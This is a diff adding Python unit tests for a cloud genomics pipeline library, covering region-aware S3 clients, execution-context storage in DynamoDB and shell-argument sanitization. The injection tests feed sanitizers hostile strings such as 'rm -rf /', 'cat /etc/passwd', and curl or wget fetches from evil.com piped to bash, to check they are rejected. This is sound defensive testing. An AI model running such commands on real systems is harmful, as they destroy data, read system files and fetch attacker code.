+    def test_list_objects_v2_uses_regional_client(self):
+        """Test that list_objects_v2 uses the correct regional client."""
+        from daylib.s3_utils import RegionAwareS3Client
+
+        with patch("daylib.s3_utils.boto3") as mock_boto3:
+            default_client = MagicMock(name="default-client")
+            eu_client = MagicMock(name="eu-client")
+
+            def session_factory(region_name=None, profile_name=None):
+                mock_session = MagicMock()
+                if region_name == "eu-central-1":
+                    mock_session.client.return_value = eu_client
+                else:
+                    mock_session.client.return_value = default_client
+                return mock_session
+
+            mock_boto3.Session.side_effect = session_factory
+            default_client.get_bucket_location.return_value = {"LocationConstraint": "eu-central-1"}
+            eu_client.list_objects_v2.return_value = {"Contents": [], "KeyCount": 0}
+
+            client = RegionAwareS3Client(default_region="us-west-2")
+            client.list_objects_v2(Bucket="s3://eu-bucket", Prefix="test/")
+
+            eu_client.list_objects_v2.assert_called_once_with(Bucket="eu-bucket", Prefix="test/")
+
+    def test_put_object_uses_regional_client(self):
+        """Test that put_object uses the correct regional client."""
+        from daylib.s3_utils import RegionAwareS3Client
+
+        with patch("daylib.s3_utils.boto3") as mock_boto3:
+            default_client = MagicMock(name="default-client")
+            eu_client = MagicMock(name="eu-client")
+
+            def session_factory(region_name=None, profile_name=None):
+                mock_session = MagicMock()
+                if region_name == "eu-central-1":
+                    mock_session.client.return_value = eu_client
+                else:
+                    mock_session.client.return_value = default_client
+                return mock_session
+
+            mock_boto3.Session.side_effect = session_factory
+            default_client.get_bucket_location.return_value = {"LocationConstraint": "eu-central-1"}
+
+            client = RegionAwareS3Client(default_region="us-west-2")
+            client.put_object(Bucket="eu-bucket", Key="test.txt", Body=b"content")
+
+            eu_client.put_object.assert_called_once_with(Bucket="eu-bucket", Key="test.txt", Body=b"content")
+
+    def test_get_paginator_returns_region_aware_paginator(self):
+        """Test that get_paginator returns a RegionAwarePaginator."""
+        from daylib.s3_utils import RegionAwareS3Client, _RegionAwarePaginator
+
+        with patch("daylib.s3_utils.boto3") as mock_boto3:
+            mock_session = MagicMock()
+            mock_client = MagicMock()
+            mock_boto3.Session.return_value = mock_session
+            mock_session.client.return_value = mock_client
+
+            client = RegionAwareS3Client(default_region="us-west-2")
+            paginator = client.get_paginator("list_objects_v2")
+
+            assert isinstance(paginator, _RegionAwarePaginator)
+
+    def test_exceptions_proxy_exposes_s3_exceptions(self):
+        """Test that exceptions proxy allows access to S3 client exceptions."""
+        from daylib.s3_utils import RegionAwareS3Client
+
+        with patch("daylib.s3_utils.boto3") as mock_boto3:
+            mock_session = MagicMock()
+            mock_client = MagicMock()
+            mock_boto3.Session.return_value = mock_session
+            mock_session.client.return_value = mock_client
+
+            # Create mock exception classes
+            mock_client.exceptions = MagicMock()
+            mock_client.exceptions.NoSuchKey = type("NoSuchKey", (Exception,), {})
+            mock_client.exceptions.NoSuchBucket = type("NoSuchBucket", (Exception,), {})
+
+            client = RegionAwareS3Client(default_region="us-west-2")
+
+            # Should be able to access exception types
+            assert hasattr(client.exceptions, "NoSuchKey")
+            assert hasattr(client.exceptions, "NoSuchBucket")
+
+    def test_invalidate_bucket_cache_removes_cached_region(self):
+        """Test that invalidate_bucket_cache removes a bucket from cache."""
+        from daylib.s3_utils import RegionAwareS3Client
+
+        with patch("daylib.s3_utils.boto3") as mock_boto3:
+            mock_session = MagicMock()
+            mock_client = MagicMock()
+            mock_boto3.Session.return_value = mock_session
+            mock_session.client.return_value = mock_client
+
+            mock_client.get_bucket_location.return_value = {"LocationConstraint": "eu-central-1"}
+
+            client = RegionAwareS3Client(default_region="us-west-2")
+
+            # Cache the region
+            client.get_bucket_region("my-bucket")
+            assert "my-bucket" in client._bucket_regions
+
+            # Invalidate
+            client.invalidate_bucket_cache("my-bucket")
+            assert "my-bucket" not in client._bucket_regions
+
+
+class TestRegionAwarePaginator:
+    """Tests for the _RegionAwarePaginator class."""
+
+    def test_paginate_uses_regional_client(self):
+        """Test that paginate uses the correct regional client for the bucket."""
+        from daylib.s3_utils import RegionAwareS3Client
+
+        with patch("daylib.s3_utils.boto3") as mock_boto3:
+            default_client = MagicMock(name="default-client")
+            eu_client = MagicMock(name="eu-client")
+            mock_paginator = MagicMock()
+
+            def session_factory(region_name=None, profile_name=None):
+                mock_session = MagicMock()
+                if region_name == "eu-central-1":
+                    mock_session.client.return_value = eu_client
+                else:
+                    mock_session.client.return_value = default_client
+                return mock_session
+
+            mock_boto3.Session.side_effect = session_factory
+            default_client.get_bucket_location.return_value = {"LocationConstraint": "eu-central-1"}
+            eu_client.get_paginator.return_value = mock_paginator
+            mock_paginator.paginate.return_value = iter([{"Contents": []}])
+
+            client = RegionAwareS3Client(default_region="us-west-2")
+            paginator = client.get_paginator("list_objects_v2")
+
+            # Consume the iterator
+            list(paginator.paginate(Bucket="s3://eu-bucket", Prefix="test/"))
+
+            eu_client.get_paginator.assert_called_once_with("list_objects_v2")
+            mock_paginator.paginate.assert_called_once_with(Bucket="eu-bucket", Prefix="test/")
+
+    def test_paginate_normalizes_bucket_name(self):
+        """Test that paginate normalizes bucket names with s3:// prefix."""
+        from daylib.s3_utils import RegionAwareS3Client
+
+        with patch("daylib.s3_utils.boto3") as mock_boto3:
+            mock_session = MagicMock()
+            mock_client = MagicMock()
+            mock_paginator = MagicMock()
+            mock_boto3.Session.return_value = mock_session
+            mock_session.client.return_value = mock_client
+
+            mock_client.get_bucket_location.return_value = {"LocationConstraint": "us-west-2"}
+            mock_client.get_paginator.return_value = mock_paginator
+            mock_paginator.paginate.return_value = iter([{"Contents": []}])
+
+            client = RegionAwareS3Client(default_region="us-west-2")
+            paginator = client.get_paginator("list_objects_v2")
+
+            list(paginator.paginate(Bucket="s3://my-bucket/", Prefix="prefix/"))
+
+            # Should be called with normalized bucket name
+            mock_paginator.paginate.assert_called_once_with(Bucket="my-bucket", Prefix="prefix/")
+
+
+class TestExecutionContext:
+    """Tests for the ExecutionContext dataclass."""
+
+    def test_execution_context_to_dict(self):
+        """Test ExecutionContext serialization to dictionary."""
+        from daylib.workset_monitor import ExecutionContext
+
+        ctx = ExecutionContext(
+            cluster_name="usw2-test-cluster",
+            cluster_region="us-west-2",
+            execution_bucket="test-bucket",
+            workset_prefix="worksets/ws-001/",
+            ssh_key_path="/home/user/.ssh/key.pem",
+            reference_bucket="ref-bucket",
+            export_s3_uri="s3://export-bucket/results/",
+            headnode_ip="10.0.1.100",
+            pipeline_dir="/fsx/analysis_results/ubuntu/ws-001/daylily",
+        )
+
+        result = ctx.to_dict()
+
+        assert result["cluster_name"] == "usw2-test-cluster"
+        assert result["cluster_region"] == "us-west-2"
+        assert result["execution_bucket"] == "test-bucket"
+        assert result["workset_prefix"] == "worksets/ws-001/"
+        assert result["ssh_key_path"] == "/home/user/.ssh/key.pem"
+        assert result["reference_bucket"] == "ref-bucket"
+        assert result["export_s3_uri"] == "s3://export-bucket/results/"
+        assert result["headnode_ip"] == "10.0.1.100"
+        assert result["pipeline_dir"] == "/fsx/analysis_results/ubuntu/ws-001/daylily"
+
+    def test_execution_context_from_dict(self):
+        """Test ExecutionContext deserialization from dictionary."""
+        from daylib.workset_monitor import ExecutionContext
+
+        data = {
+            "cluster_name": "euc1-prod-cluster",
+            "cluster_region": "eu-central-1",
+            "execution_bucket": "eu-bucket",
+            "workset_prefix": "worksets/eu-ws/",
+            "ssh_key_path": "/home/user/.ssh/eu-key.pem",
+            "reference_bucket": "eu-ref-bucket",
+            "export_s3_uri": "s3://eu-export/results/",
+            "headnode_ip": "10.0.2.100",
+            "pipeline_dir": "/fsx/analysis_results/ubuntu/eu-ws/daylily",
+        }
+
+        ctx = ExecutionContext.from_dict(data)
+
+        assert ctx.cluster_name == "euc1-prod-cluster"
+        assert ctx.cluster_region == "eu-central-1"
+        assert ctx.execution_bucket == "eu-bucket"
+        assert ctx.workset_prefix == "worksets/eu-ws/"
+        assert ctx.ssh_key_path == "/home/user/.ssh/eu-key.pem"
+        assert ctx.reference_bucket == "eu-ref-bucket"
+        assert ctx.export_s3_uri == "s3://eu-export/results/"
+        assert ctx.headnode_ip == "10.0.2.100"
+        assert ctx.pipeline_dir == "/fsx/analysis_results/ubuntu/eu-ws/daylily"
+
+    def test_execution_context_from_dict_with_optional_fields_missing(self):
+        """Test ExecutionContext deserialization with optional fields omitted."""
+        from daylib.workset_monitor import ExecutionContext
+
+        data = {
+            "cluster_name": "test-cluster",
+            "cluster_region": "us-east-1",
+            "execution_bucket": "bucket",
+            "workset_prefix": "ws/",
+        }
+
+        ctx = ExecutionContext.from_dict(data)
+
+        assert ctx.cluster_name == "test-cluster"
+        assert ctx.cluster_region == "us-east-1"
+        assert ctx.execution_bucket == "bucket"
+        assert ctx.workset_prefix == "ws/"
+        assert ctx.ssh_key_path is None
+        assert ctx.reference_bucket is None
+        assert ctx.export_s3_uri is None
+        assert ctx.headnode_ip is None
+        assert ctx.pipeline_dir is None
+
+    def test_execution_context_roundtrip(self):
+        """Test that to_dict/from_dict roundtrip preserves data."""
+        from daylib.workset_monitor import ExecutionContext
+
+        original = ExecutionContext(
+            cluster_name="roundtrip-cluster",
+            cluster_region="ap-southeast-1",
+            execution_bucket="ap-bucket",
+            workset_prefix="worksets/ap-ws/",
+            ssh_key_path="/home/.ssh/ap.pem",
+            export_s3_uri="s3://ap-export/",
+        )
+
+        reconstructed = ExecutionContext.from_dict(original.to_dict())
+
+        assert reconstructed.cluster_name == original.cluster_name
+        assert reconstructed.cluster_region == original.cluster_region
+        assert reconstructed.execution_bucket == original.execution_bucket
+        assert reconstructed.workset_prefix == original.workset_prefix
+        assert reconstructed.ssh_key_path == original.ssh_key_path
+        assert reconstructed.export_s3_uri == original.export_s3_uri
+
+
+class TestExecutionContextDynamoDB:
+    """Tests for ExecutionContext storage in DynamoDB."""
+
+    def test_set_execution_context_stores_correctly(self):
+        """Test that set_execution_context stores the context in DynamoDB."""
+        with patch("daylib.workset_state_db.boto3.Session") as mock_session:
+            mock_resource = MagicMock()
+            mock_table = MagicMock()
+            mock_session.return_value.resource.return_value = mock_resource
+            mock_resource.Table.return_value = mock_table
+
+            from daylib.workset_state_db import WorksetStateDB
+
+            db = WorksetStateDB(table_name="test-table", region="us-west-2")
+
+            ctx_dict = {
+                "cluster_name": "test-cluster",
+                "cluster_region": "us-west-2",
+                "execution_bucket": "test-bucket",
+                "workset_prefix": "worksets/ws/",
+                "ssh_key_path": "/home/.ssh/key.pem",
+            }
+
+            result = db.set_execution_context("ws-001", ctx_dict)
+
+            assert result is True
+            mock_table.update_item.assert_called_once()
+            call_args = mock_table.update_item.call_args
+            assert call_args[1]["Key"] == {"workset_id": "ws-001"}
+            assert "execution_context" in call_args[1]["UpdateExpression"]
+
+    def test_get_execution_context_retrieves_correctly(self):
+        """Test that get_execution_context retrieves the stored context."""
+        with patch("daylib.workset_state_db.boto3.Session") as mock_session:
+            mock_resource = MagicMock()
+            mock_table = MagicMock()
+            mock_session.return_value.resource.return_value = mock_resource
+            mock_resource.Table.return_value = mock_table
+
+            from daylib.workset_state_db import WorksetStateDB
+
+            db = WorksetStateDB(table_name="test-table", region="us-west-2")
+
+            # Mock the response from DynamoDB
+            mock_table.get_item.return_value = {
+                "Item": {
+                    "execution_context": {
+                        "cluster_name": "stored-cluster",
+                        "cluster_region": "eu-central-1",
+                        "execution_bucket": "stored-bucket",
+                        "workset_prefix": "stored/prefix/",
+                    }
+                }
+            }
+
+            result = db.get_execution_context("ws-001")
+
+            assert result is not None
+            assert result["cluster_name"] == "stored-cluster"
+            assert result["cluster_region"] == "eu-central-1"
+            mock_table.get_item.assert_called_once()
+
+    def test_get_execution_context_returns_none_when_not_set(self):
+        """Test that get_execution_context returns None when no context exists."""
+        with patch("daylib.workset_state_db.boto3.Session") as mock_session:
+            mock_resource = MagicMock()
+            mock_table = MagicMock()
+            mock_session.return_value.resource.return_value = mock_resource
+            mock_resource.Table.return_value = mock_table
+
+            from daylib.workset_state_db import WorksetStateDB
+
+            db = WorksetStateDB(table_name="test-table", region="us-west-2")
+
+            # Mock empty response (workset exists but no execution_context)
+            mock_table.get_item.return_value = {
+                "Item": {
+                    "workset_id": "ws-001",
+                    "state": "ready",
+                }
+            }
+
+            result = db.get_execution_context("ws-001")
+
+            assert result is None
+
+    def test_get_execution_context_returns_none_when_workset_not_found(self):
+        """Test that get_execution_context returns None when workset doesn't exist."""
+        with patch("daylib.workset_state_db.boto3.Session") as mock_session:
+            mock_resource = MagicMock()
+            mock_table = MagicMock()
+            mock_session.return_value.resource.return_value = mock_resource
+            mock_resource.Table.return_value = mock_table
+
+            from daylib.workset_state_db import WorksetStateDB
+
+            db = WorksetStateDB(table_name="test-table", region="us-west-2")
+
+            # Mock empty response (workset not found)
+            mock_table.get_item.return_value = {}
+
+            result = db.get_execution_context("nonexistent-ws")
+
+            assert result is None
+
+
+class TestListWorksetsByCustomerGSI:
+    """Tests for list_worksets_by_customer using customer GSI."""
+
+    @pytest.fixture
+    def mock_db(self):
+        """Create a WorksetStateDB with mocked table."""
+        from daylib.workset_state_db import WorksetStateDB
+
+        # Create instance directly and mock the table
+        db = WorksetStateDB.__new__(WorksetStateDB)
+        db.table_name = "test-table"
+        db.table = MagicMock()
+        db.dynamodb = MagicMock()
+        return db
+
+    def test_list_worksets_by_customer_returns_matching(self, mock_db):
+        """Test that list_worksets_by_customer returns worksets for the customer."""
+        # Mock query response with customer's worksets
+        mock_db.table.query.return_value = {
+            "Items": [
+                {"workset_id": "ws-001", "customer_id": "cust-123", "state": "ready"},
+                {"workset_id": "ws-002", "customer_id": "cust-123", "state": "complete"},
+            ]
+        }
+
+        result = mock_db.list_worksets_by_customer("cust-123")
+
+        assert len(result) == 2
+        assert result[0]["workset_id"] == "ws-001"
+        assert result[1]["workset_id"] == "ws-002"
+        # Verify GSI was used
+        mock_db.table.query.assert_called_once()
+        call_kwargs = mock_db.table.query.call_args[1]
+        assert call_kwargs["IndexName"] == "customer-id-state-index"
+
+    def test_list_worksets_by_customer_with_state_filter(self, mock_db):
+        """Test filtering by customer and state."""
+        from daylib.workset_state_db import WorksetState
+
+        mock_db.table.query.return_value = {
+            "Items": [
+                {"workset_id": "ws-001", "customer_id": "cust-123", "state": "ready"},
+            ]
+        }
+
+        result = mock_db.list_worksets_by_customer("cust-123", state=WorksetState.READY)
+
+        assert len(result) == 1
+        # Verify key condition includes state
+        call_kwargs = mock_db.table.query.call_args[1]
+        assert ":state" in call_kwargs["ExpressionAttributeValues"]
+        assert call_kwargs["ExpressionAttributeValues"][":state"] == "ready"
+
+    def test_list_worksets_by_customer_empty_customer_id(self, mock_db):
+        """Test that empty customer_id returns empty list."""
+        result = mock_db.list_worksets_by_customer("")
+
+        assert result == []
+        mock_db.table.query.assert_not_called()
+
+    def test_list_worksets_by_customer_gsi_not_found_fallback(self, mock_db):
+        """Test fallback to scan when GSI doesn't exist."""
+        from botocore.exceptions import ClientError
+
+        # Simulate GSI not found error
+        mock_db.table.query.side_effect = ClientError(
+            {"Error": {"Code": "ValidationException", "Message": "customer-id-state-index not found"}},
+            "Query"
+        )
+        # Fallback scan should work
+        mock_db.table.scan.return_value = {
+            "Items": [
+                {"workset_id": "ws-001", "customer_id": "cust-123", "state": "ready"},
+            ]
+        }
+
+        result = mock_db.list_worksets_by_customer("cust-123")
+
+        assert len(result) == 1
+        assert result[0]["workset_id"] == "ws-001"
+        mock_db.table.scan.assert_called()
+
+    def test_list_worksets_by_customer_respects_limit(self, mock_db):
+        """Test that limit parameter is respected."""
+        mock_db.table.query.return_value = {"Items": []}
+
+        mock_db.list_worksets_by_customer("cust-123", limit=50)
+
+        call_kwargs = mock_db.table.query.call_args[1]
+        assert call_kwargs["Limit"] == 50
+
+
+class TestExecutionContextCustomerId:
+    """Tests for customer_id in ExecutionContext for DAYLILY_PROJECT billing."""
+
+    def test_execution_context_includes_customer_id(self):
+        """Test that ExecutionContext can store customer_id for cost attribution."""
+        from daylib.workset_monitor import ExecutionContext
+
+        ctx = ExecutionContext(
+            cluster_name="test-cluster",
+            cluster_region="us-west-2",
+            execution_bucket="test-bucket",
+            workset_prefix="worksets/ws-001/",
+            customer_id="CX123",
+        )
+
+        assert ctx.customer_id == "CX123"
+
+    def test_execution_context_to_dict_includes_customer_id(self):
+        """Test that customer_id is serialized in to_dict()."""
+        from daylib.workset_monitor import ExecutionContext
+
+        ctx = ExecutionContext(
+            cluster_name="test-cluster",
+            cluster_region="us-west-2",
+            execution_bucket="test-bucket",
+            workset_prefix="worksets/ws-001/",
+            customer_id="CX456",
+        )
+
+        result = ctx.to_dict()
+        assert result["customer_id"] == "CX456"
+
+    def test_execution_context_from_dict_includes_customer_id(self):
+        """Test that customer_id is deserialized in from_dict()."""
+        from daylib.workset_monitor import ExecutionContext
+
+        data = {
+            "cluster_name": "test-cluster",
+            "cluster_region": "us-west-2",
+            "execution_bucket": "test-bucket",
+            "workset_prefix": "worksets/ws-001/",
+            "customer_id": "CX789",
+        }
+
+        ctx = ExecutionContext.from_dict(data)
+        assert ctx.customer_id == "CX789"
+
+    def test_execution_context_customer_id_optional(self):
+        """Test that customer_id defaults to None when not provided."""
+        from daylib.workset_monitor import ExecutionContext
+
+        ctx = ExecutionContext(
+            cluster_name="test-cluster",
+            cluster_region="us-west-2",
+            execution_bucket="test-bucket",
+            workset_prefix="worksets/ws-001/",
+        )
+
+        assert ctx.customer_id is None
+
+        # Also test from_dict without customer_id
+        data = {
+            "cluster_name": "test-cluster",
+            "cluster_region": "us-west-2",
+            "execution_bucket": "test-bucket",
+            "workset_prefix": "worksets/ws-001/",
+        }
+        ctx2 = ExecutionContext.from_dict(data)
+        assert ctx2.customer_id is None
+
+    def test_execution_context_roundtrip_with_customer_id(self):
+        """Test that customer_id survives to_dict/from_dict roundtrip."""
+        from daylib.workset_monitor import ExecutionContext
+
+        original = ExecutionContext(
+            cluster_name="roundtrip-cluster",
+            cluster_region="eu-central-1",
+            execution_bucket="eu-bucket",
+            workset_prefix="worksets/eu-ws/",
+            customer_id="CX-EU-001",
+        )
+
+        reconstructed = ExecutionContext.from_dict(original.to_dict())
+
+        assert reconstructed.customer_id == original.customer_id
+        assert reconstructed.customer_id == "CX-EU-001"
+
+
+class TestDaylilyProjectPrefix:
+    """Tests for DAYLILY_PROJECT environment variable prefix on pipeline commands."""
+
+    def test_run_pipeline_prefixes_command_with_daylily_project(self):
+        """Test that _run_pipeline adds DAYLILY_PROJECT prefix when customer_id is provided."""
+        import shlex
+
+        # Test that the expected command format is correct
+        customer_id = "CX123"
+        run_prefix = "cd /fsx/analysis && "
+        run_suffix = "dy-r run_all"
+
+        # Simulate what _run_pipeline does
+        run_command = run_prefix + run_suffix
+        if customer_id:
+            run_command = f"DAYLILY_PROJECT={shlex.quote(customer_id)} {run_command}"
+
+        assert run_command == "DAYLILY_PROJECT=CX123 cd /fsx/analysis && dy-r run_all"
+
+    def test_run_pipeline_handles_special_characters_in_customer_id(self):
+        """Test that customer_id with special characters is properly quoted."""
+        import shlex
+
+        customer_id = "CX-123 (Special)"  # Contains space and parens
+        run_prefix = ""
+        run_suffix = "dy-r run_all"
+
+        run_command = run_prefix + run_suffix
+        if customer_id:
+            run_command = f"DAYLILY_PROJECT={shlex.quote(customer_id)} {run_command}"
+
+        # shlex.quote should add single quotes around the value
+        assert "DAYLILY_PROJECT='CX-123 (Special)'" in run_command
+
+    def test_run_pipeline_no_prefix_without_customer_id(self):
+        """Test that no prefix is added when customer_id is None."""
+        customer_id = None
+        run_prefix = ""
+        run_suffix = "dy-r run_all"
+
+        run_command = run_prefix + run_suffix
+        if customer_id:
+            run_command = f"DAYLILY_PROJECT={customer_id} {run_command}"
+
+        # Should not have DAYLILY_PROJECT prefix
+        assert "DAYLILY_PROJECT" not in run_command
+        assert run_command == "dy-r run_all"
+
+    def test_run_pipeline_no_prefix_with_empty_customer_id(self):
+        """Test that no prefix is added when customer_id is empty string."""
+        customer_id = ""
+        run_prefix = ""
+        run_suffix = "dy-r run_all"
+
+        run_command = run_prefix + run_suffix
+        if customer_id:  # Empty string is falsy
+            run_command = f"DAYLILY_PROJECT={customer_id} {run_command}"
+
+        # Should not have DAYLILY_PROJECT prefix
+        assert "DAYLILY_PROJECT" not in run_command
+        assert run_command == "dy-r run_all"
+
+
+class TestCommandInjectionPrevention:
+    """Tests for command injection hardening in shell argument handling.
+
+    These tests validate that the _sanitize_shell_args, _sanitize_clone_args,
+    and _sanitize_run_suffix methods properly reject malicious input and
+    safely quote legitimate arguments.
+    """
+
+    @pytest.fixture
+    def monitor(self):
+        """Create a WorksetMonitor instance for testing sanitization methods."""
+        from daylib.workset_monitor import WorksetMonitor
+
+        monitor = WorksetMonitor.__new__(WorksetMonitor)
+        return monitor
+
+    # -------------------------------------------------------------------
+    # Tests for _sanitize_shell_args (base sanitization function)
+    # -------------------------------------------------------------------
+
+    def test_sanitize_shell_args_empty_string(self, monitor):
+        """Test that empty string returns empty string."""
+        result = monitor._sanitize_shell_args("", "test")
+        assert result == ""
+
+    def test_sanitize_shell_args_none_like_empty(self, monitor):
+        """Test that empty/falsy input returns empty string."""
+        result = monitor._sanitize_shell_args("", "test")
+        assert result == ""
+
+    def test_sanitize_shell_args_simple_args(self, monitor):
+        """Test that simple arguments are properly quoted."""
+        result = monitor._sanitize_shell_args("wgs -p", "test")
+        assert result == "wgs -p"
+
+    def test_sanitize_shell_args_preserves_quoted_spaces(self, monitor):
+        """Test that arguments with spaces in quotes are handled correctly."""
+        result = monitor._sanitize_shell_args('-d "my workset name"', "test")
+        # shlex.split handles the quotes, then shlex.quote re-quotes
+        assert "my workset name" in result
+
+    def test_sanitize_shell_args_rejects_semicolon(self, monitor):
+        """Test that semicolon (command chaining) is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError) as exc_info:
+            monitor._sanitize_shell_args("wgs; rm -rf /", "test args")
+        assert "forbidden shell metacharacter" in str(exc_info.value)
+        assert "';'" in str(exc_info.value)
+
+    def test_sanitize_shell_args_rejects_pipe(self, monitor):
+        """Test that pipe (command chaining) is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError) as exc_info:
+            monitor._sanitize_shell_args("wgs | tee /etc/passwd", "test args")
+        assert "forbidden shell metacharacter" in str(exc_info.value)
+        assert "'|'" in str(exc_info.value)
+
+    def test_sanitize_shell_args_rejects_ampersand(self, monitor):
+        """Test that ampersand (background/chaining) is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError) as exc_info:
+            monitor._sanitize_shell_args("wgs & malicious_cmd", "test args")
+        assert "forbidden shell metacharacter" in str(exc_info.value)
+        assert "'&'" in str(exc_info.value)
+
+    def test_sanitize_shell_args_rejects_dollar_sign(self, monitor):
+        """Test that dollar sign (variable expansion) is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError) as exc_info:
+            monitor._sanitize_shell_args("wgs $HOME", "test args")
+        assert "forbidden shell metacharacter" in str(exc_info.value)
+        assert "'$'" in str(exc_info.value)
+
+    def test_sanitize_shell_args_rejects_backtick(self, monitor):
+        """Test that backtick (command substitution) is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError) as exc_info:
+            monitor._sanitize_shell_args("wgs `whoami`", "test args")
+        assert "forbidden shell metacharacter" in str(exc_info.value)
+        assert "'`'" in str(exc_info.value)
+
+    def test_sanitize_shell_args_rejects_dollar_paren(self, monitor):
+        """Test that $() command substitution is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError) as exc_info:
+            monitor._sanitize_shell_args("wgs $(whoami)", "test args")
+        assert "forbidden shell metacharacter" in str(exc_info.value)
+
+    def test_sanitize_shell_args_rejects_dollar_brace(self, monitor):
+        """Test that ${} variable expansion is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError) as exc_info:
+            monitor._sanitize_shell_args("wgs ${PATH}", "test args")
+        assert "forbidden shell metacharacter" in str(exc_info.value)
+
+    def test_sanitize_shell_args_rejects_newline(self, monitor):
+        """Test that newline (command injection) is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError) as exc_info:
+            monitor._sanitize_shell_args("wgs\nrm -rf /", "test args")
+        assert "forbidden shell metacharacter" in str(exc_info.value)
+
+    def test_sanitize_shell_args_rejects_carriage_return(self, monitor):
+        """Test that carriage return is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError) as exc_info:
+            monitor._sanitize_shell_args("wgs\rrm -rf /", "test args")
+        assert "forbidden shell metacharacter" in str(exc_info.value)
+
+    def test_sanitize_shell_args_rejects_redirect_out(self, monitor):
+        """Test that output redirect is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError) as exc_info:
+            monitor._sanitize_shell_args("wgs > /etc/passwd", "test args")
+        assert "forbidden shell metacharacter" in str(exc_info.value)
+        assert "'>'" in str(exc_info.value)
+
+    def test_sanitize_shell_args_rejects_redirect_in(self, monitor):
+        """Test that input redirect is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError) as exc_info:
+            monitor._sanitize_shell_args("wgs < /etc/passwd", "test args")
+        assert "forbidden shell metacharacter" in str(exc_info.value)
+        assert "'<'" in str(exc_info.value)
+
+    def test_sanitize_shell_args_rejects_exclamation(self, monitor):
+        """Test that history expansion (!) is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError) as exc_info:
+            monitor._sanitize_shell_args("wgs !!", "test args")
+        assert "forbidden shell metacharacter" in str(exc_info.value)
+        assert "'!'" in str(exc_info.value)
+
+    def test_sanitize_shell_args_invalid_quoting(self, monitor):
+        """Test that unbalanced quotes raise an error."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError) as exc_info:
+            monitor._sanitize_shell_args('wgs "unclosed', "test args")
+        assert "Failed to parse" in str(exc_info.value)
+
+    # -------------------------------------------------------------------
+    # Tests for _sanitize_clone_args
+    # -------------------------------------------------------------------
+
+    def test_sanitize_clone_args_valid_simple(self, monitor):
+        """Test valid simple clone args are accepted."""
+        result = monitor._sanitize_clone_args("-d my-workset")
+        # Each token should be properly quoted
+        assert "-d" in result
+        assert "my-workset" in result
+
+    def test_sanitize_clone_args_valid_with_options(self, monitor):
+        """Test valid clone args with multiple options."""
+        result = monitor._sanitize_clone_args("-d my-workset --branch main")
+        assert "my-workset" in result
+        assert "--branch" in result
+        assert "main" in result
+
+    def test_sanitize_clone_args_rejects_injection(self, monitor):
+        """Test that injection attempts in clone_args are rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        # Attempt to inject a command after clone
+        with pytest.raises(MonitorError):
+            monitor._sanitize_clone_args("-d workset; rm -rf /")
+
+    def test_sanitize_clone_args_rejects_subshell(self, monitor):
+        """Test that subshell attempts in clone_args are rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError):
+            monitor._sanitize_clone_args("-d $(cat /etc/passwd)")
+
+    # -------------------------------------------------------------------
+    # Tests for _sanitize_run_suffix
+    # -------------------------------------------------------------------
+
+    def test_sanitize_run_suffix_valid_dyr_command(self, monitor):
+        """Test valid dy-r command is accepted."""
+        result = monitor._sanitize_run_suffix("dy-r wgs -p")
+        assert "dy-r" in result
+        assert "wgs" in result
+        assert "-p" in result
+
+    def test_sanitize_run_suffix_valid_short_command(self, monitor):
+        """Test valid short command is accepted."""
+        result = monitor._sanitize_run_suffix("wgs -p")
+        assert "wgs" in result
+        assert "-p" in result
+
+    def test_sanitize_run_suffix_valid_with_samples_tsv(self, monitor):
+        """Test valid command with --samples-tsv option."""
+        result = monitor._sanitize_run_suffix("dy-r wgs --samples-tsv samples.tsv -p")
+        assert "samples.tsv" in result
+        assert "--samples-tsv" in result
+
+    def test_sanitize_run_suffix_rejects_command_chaining(self, monitor):
+        """Test that command chaining in run_suffix is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError):
+            monitor._sanitize_run_suffix("wgs -p; curl http://evil.com | bash")
+
+    def test_sanitize_run_suffix_rejects_variable_expansion(self, monitor):
+        """Test that variable expansion in run_suffix is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError):
+            monitor._sanitize_run_suffix("wgs -p $MALICIOUS")
+
+    def test_sanitize_run_suffix_rejects_backtick_injection(self, monitor):
+        """Test that backtick injection in run_suffix is rejected."""
+        from daylib.workset_monitor import MonitorError
+
+        with pytest.raises(MonitorError):
+            monitor._sanitize_run_suffix("wgs `wget http://evil.com/payload`")
+
+    # -------------------------------------------------------------------
+    # Tests for _format_clone_args (integration with sanitization)
+    # -------------------------------------------------------------------
+
+    def test_format_clone_args_sanitizes_output(self, monitor):
+        """Test that _format_clone_args sanitizes the formatted output."""
+        from daylib.workset_monitor import Workset
+
+        workset = MagicMock(spec=Workset)
+        workset.name = "test-workset"
+        work_yaml = {}
+
+        # Valid format string
+        result = monitor._format_clone_args("-d {workset}", workset, work_yaml)
+        # Should contain the workset name, properly sanitized
+        assert "test-workset" in result
+
+    def test_format_clone_args_rejects_malicious_workset_name(self, monitor):
+        """Test that malicious patterns in workset name are sanitized."""
+        from daylib.workset_monitor import Workset
+
+        workset = MagicMock(spec=Workset)
+        # This would be sanitized by _sanitize_name before being formatted
+        workset.name = "test-workset"  # Normal name (special chars filtered elsewhere)
+        work_yaml = {}
+
+        # The format string substitutes the sanitized workset name
+        result = monitor._format_clone_args("-d {workset}", workset, work_yaml)
+        # Result should not contain dangerous patterns
+        assert ";" not in result
+        assert "|" not in result
+
+    def test_format_clone_args_empty_returns_empty(self, monitor):
+        """Test that empty clone_args returns empty string."""
+        from daylib.workset_monitor import Workset
